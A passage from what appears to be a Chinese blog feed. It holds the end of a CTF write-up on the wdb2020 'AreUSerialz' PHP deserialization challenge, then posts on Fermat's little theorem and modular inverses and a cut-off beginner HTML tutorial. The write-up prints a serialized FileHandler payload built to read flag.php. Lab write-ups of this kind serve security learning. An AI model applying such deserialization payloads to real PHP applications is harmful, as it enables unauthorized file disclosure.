class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> serialize(<span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//echo(serialize($this));</span></span><br><span class="line">        <span class="comment">//if($this-&gt;op === &quot;2&quot;)</span></span><br><span class="line">        <span class="comment">//    $this-&gt;op = &quot;1&quot;;</span></span><br><span class="line">        <span class="comment">//$this-&gt;content = &quot;&quot;;</span></span><br><span class="line">        <span class="comment">//$this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="comment">//$res=&#x27;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;r&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2022/04/28/wdb2020AreUSerialz/1.png" alt="1"></p><p>那么这个 <code>payload</code> 直接打进去就可以再浏览器源代码模式看到读出的 <code>flag</code> 了。</p><p><img src="/2022/04/28/wdb2020AreUSerialz/2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;做到一道题，写下 &lt;code&gt;write up&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="php反序列化" scheme="http://example.com/categories/ctf/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>费马小定理的应用及证明</title>
    <link href="http://example.com/2022/04/28/femal/"/>
    <id>http://example.com/2022/04/28/femal/</id>
    <published>2022-04-27T16:00:00.000Z</published>
    <updated>2022-04-27T18:25:03.694Z</updated>
    
    <content type="html"><![CDATA[<p>小学一波数论</p><span id="more"></span><h2 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h2><p>若 $p$ 为素数，$\gcd(a, p) = 1$，则 $a^{p - 1} \equiv 1 \pmod{p}$。</p><p>另一个形式：对于任意整数 $a$，有 $a^p \equiv a \pmod{p}$。</p><h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><p>设一个质数为 $p$，我们取一个不为 $p$ 倍数的数 $a$。</p><p>构造一个序列：$A={1,2,3\dots,p-1}$，这个序列有着这样一个性质：</p><p>$$<br>\prod_{i=1}^{n}\space A_i\equiv\prod_{i=1}^{n} (A_i\times a) \pmod p<br>$$</p><p>证明：</p><p>$$<br>\because gcd(A_i,p)=1,gcd(A_i\times a,p)=1<br>$$</p><p>又因为每一个 $A_i\times a \pmod p$ 都是独一无二的，且 $A_i\times a \pmod p &lt; p$</p><p>得证（每一个 $A_i\times a$ 都对应了一个 $A_i$)</p><p>设 $f=(p-1)!$, 则 $f\equiv a\times A_1\times a\times A_2\times a \times A_3 \dots \times  A_{p-1} \pmod p$</p><p>$$<br>a^{p-1}\times f \equiv f \pmod p \     a^{p-1} \equiv 1 \pmod p<br>$$</p><p>证毕。</p><h2 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h2><p>欧拉定理实际上就是费马小定理的推广，欧拉定理的内容如下。</p><p>若 $\gcd(a, m) = 1$，则 $a^{\varphi(m)} \equiv 1 \pmod{m}$。</p><p>至于这个证明么，有点复杂，不细讲了（实则也不会）。可以说，费马小定理撑起了很多东西，比如我们经常算的逆元，或者是经典非对称加密 <code>RSA</code> 都有用到费马小定理。</p><h2 id="逆元"><a href="#逆元" class="headerlink" title="逆元"></a>逆元</h2><p>这个概念是抽象代数里面的，定义代数中的二元运算 <code>*</code> 和有限集 <code>G</code> ，若 $a*b∈G(a∈G,b∈G)$ 则，群 $&lt;G,*&gt;$ 是一个关系代数。</p><p>代数中，有一个很重要的概念就是幺元 ，幺元是指与任意数进行关系运算结果都等于那个数，比如在加法运算中，0就是幺元，因为0加任何数都等于任何数嘛。在乘法中，1就是幺元，同样1乘任何数也等于任何数。而逆元就是说两个数相互进行关系运算之后得到幺元，那么这两个数就互称为对方的逆元。</p><p>而我们平时算法竞赛研究的代数体系通常是乘法取模运算，它其实跟乘法类似，就多个取模，取模也限定了它集合的有限性。在乘法模运算中，我们不难发现1是幺元。所以若 $b$ 是 $a$ 在模 $m$ 意义下的逆元，则有 $a\times b \equiv 1 \pmod p$。而这个1我们稍微用一下费马小定理，把它变成 $a^{p-1}$，那么整个式子就变成了 $b\equiv a^{p-2}\ (mod\ p)$。我们就能已知其中一个数算出另一个数的逆元了，至于幂运算可以使用快速幂解决，那么我们算一个数的逆元的复杂度就是 $O(log_2p)$ 了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;小学一波数论&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="数论" scheme="http://example.com/categories/icpc/%E6%95%B0%E8%AE%BA/"/>
    
    <category term="费马小定理" scheme="http://example.com/categories/icpc/%E6%95%B0%E8%AE%BA/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>html语言的学习</title>
    <link href="http://example.com/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-23T16:00:10.000Z</published>
    <updated>2022-04-24T16:21:58.400Z</updated>
    
    <content type="html"><![CDATA[<p>来学学 <code>html</code> (超文本标记语言)。</p><p>超文本标记语言)是一种用于创建网页的标准标记语言。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想彻彻底底学一遍 <code>web</code> 安全，先从最基本的 <code>html</code> 开始吧，首先 <code>html</code> 是给浏览器执行的语言，也就是说 <code>html</code> 是在我们本地的，是前端语言，相反 <code>php</code> 就是后端语言了，在服务器执行完得到结果之后以 <code>html</code> 的形式返回给用户，先最基本了解一下 <code>html</code> 有一个清晰的概念。</p><h2 id="html语法"><a href="#html语法" class="headerlink" title="html语法"></a>html语法</h2><p><code>html</code> 语法较为松散，以至于你基本见不到因为 <code>html</code> 报的错（这也就更加考验了我们的代码功底，因为写错了某些东西它不会报错的）。<code>html</code> 说到底它就是由标签(有时候也成为”元素”)和对应的属性组成的，万种语言都有自己的 <code>hello world</code>，同样我们也先写一个 <code>hello world</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            hello world!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们把它放到我们搭建的网站的根目录，用浏览器访问 <code>127.0.0.1</code> 看看，请注意，写好的 <code>html</code> 文件不要直接打开，养成好习惯，使用<code>http</code> 协议访问它，用 <code>file</code> 协议虽然能访问到，但是当需要执行 <code>php</code> 脚本的时候会出现很多麻烦。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>那么我们来细细讲讲标签。</p><p>标签就是由一对尖括号 <code>&lt;&gt;</code>组成的，标签的基本形式就是 <code>&lt;标签名&gt;xxx&lt;/标签名&gt;</code>，可以嵌套其它标签。</p><p>当然也有单身狗标签是自己一个人当一个标签，形如<code>&lt;标签名/&gt;</code> ，不能嵌套其它标签。</p><p>标签可以相互嵌套，在上面这个例子中，不难发现 <code>html</code> 标签内包含 <code>body</code> 标签，<code>body</code> 标签包含 <code>div</code> 标签。我们还可以发现，标签不会直接显示在网页中，但是我们能从 <code>F12</code> 的控制台中看见我们写的 <code>html</code> 代码。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>标签可以嵌套文字，这些文字会依附标签，并根据标签的特性显示文字。</p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>属性会写在开始标签的尖括号内，一般形式为 <code>&lt;标签名 属性名1=属性值1 属性名2=属性值2 ...&gt;</code>。比如现在想玩点花的，我不想显示普通的 <code>hello world</code> ，我想换个颜色，比如红色，我换成如下代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span></span><br><span class="line">            hello world!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为 <code>div</code> 标签不支持 <code>color</code> 属性，因此这里换成 <code>font</code> 标签，可以看到达到了我们预期的效果。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><p>在这个例子中的 <code>font</code> 标签我们就为他指定了属性，属性名为 <code>color</code>，对应的值为 <code>&quot;red&quot;</code> ，表示了这个标签的内容将显示红色字体。</p><h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><ul><li><code>div</code>：作为布局容器</li><li><code>a</code>标签：用作点击跳转</li><li><code>img</code>：显示图片，单个出现</li><li><code>table,tr,td</code>：表格</li><li><code>ul,ol</code>：列表</li><li><code>h1-h6</code>：1-6级标题</li><li><code>br</code>：换行</li><li><code>input</code>：表单类</li></ul><h4 id="div"><a href="#div" class="headerlink" title="div"></a>div</h4><p>这个暂时先不讲，应该等到后面讲布局的时候会说到</p><h4 id="a"><a href="#a" class="headerlink" title="a"></a>a</h4><p>网页跳转是我们比较熟知的功能了，比如我 <code>google</code> 搜出来很多结果，结果不可能显示整个页面，它会给出一个标题，然后设置超链接跳转到这个页面，<code>a</code> 标签就是专门用来做跳转的，标签包括的内容将全部会被设上超链接跳转到 <code>href</code> 属性指定的链接地址。如果跳转到本站的某个页面，直接从网站根目录开始指定路径即可，如果跳转到外站的话则需要从 <code>http://</code> 开始书写超链接。</p><h5 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://xia0ji233.pro/&quot;</span>&gt;</span></span><br><span class="line">                这是一个超链接</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们看看效果：</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" alt="4"></p><p>可以看到，鼠标悬停在文本的时候会显示超链接链接的地址，点击可以跳转到对应的页面。</p><h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><p>显示图片的标签，单个出现，由 <code>src</code> 属性指定图片路径，如果图片在本站则可以直接从根目录指定路径，引用站外图片则需要书写图片完整的超链接。</p><h5 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/1.jpg&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到成功引用图片</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png" alt="5"></p><p>我们也可以写一个代码来引用站外图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://codeforces.org/s/14146/images/codeforces-logo-with-telegram.png&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功引用 <code>codeforces</code> 的 <code>logo</code>。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/6.png" alt="6"></p><h4 id="tr-td"><a href="#tr-td" class="headerlink" title="tr,td"></a>tr,td</h4><p>这个我也还在摸索，不过经过我自己的测试大概能讲出一二，<code>tr</code> 为一行，然后 <code>td</code> 为一行中的一列标签。 用数据库的术语来说呢，就是：<code>&lt;tr&gt;</code> 标签为一条整记录， <code>&lt;td&gt;</code> 标签为一条记录的其中一个字段的值。</p><p>我们也写一个demo</p><h5 id="demo-2"><a href="#demo-2" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        aaaaaaaaaaaaa</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        bbbbbbbb</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        cccccc</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        ddd</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到效果如下</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/7.png" alt="7"></p><h4 id="ul-ol"><a href="#ul-ol" class="headerlink" title="ul,ol"></a>ul,ol</h4><p>这俩是无序列表和有序列表，经常用 <code>markdown</code> 写博客的师傅对这个应该不会很陌生，我们来看看效果以及差异即可。</p><h5 id="demo-3"><a href="#demo-3" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ddd<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>eee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ggg<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>hhh<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/8.png" alt="8"></p><p>将代码中的 <code>ul</code> 换成 <code>ol</code> 之后呢，效果是这样的</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/9.png" alt="9"></p><h4 id="h1-h6"><a href="#h1-h6" class="headerlink" title="h1-h6"></a>h1-h6</h4><p>1-6级的标题。</p><h5 id="demo-4"><a href="#demo-4" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是二级标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是三级标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h4</span>&gt;</span>这是四级标题<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h5</span>&gt;</span>这是五级标题<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h6</span>&gt;</span>这是六级标题<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/10.png" alt="10"></p><h4 id="br"><a href="#br" class="headerlink" title="br"></a>br</h4><p>换行标签，就跟我们 <code>C</code> 里面的 <code>\n</code> 一样一样的。</p><h5 id="demo-5"><a href="#demo-5" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            这是第一行</span><br><span class="line">            如果没有加br标签，这里还是第一行<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            前面加了br标签，因此这里开始是第二行</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下，这个demo也是充分展现了，代码里换行仅仅只是为了好看，真的要换行还得这个标签出马。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/11.png" alt="11"></p><p>到这里，常用的标签就讲完了。</p><h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><p>这个其实也算是非常常见的标签了，只不过它有点小复杂，因此单独拎出来讲讲。</p><p>这个主要用于收集表单用的控件，使用 <code>type</code> 属性指定它具体是哪一类控件，这些控件通常会在 <code>form</code> 标签内，指定 <code>form</code> 标签提交方式，当点击提交时便会将这个 <code>form</code> 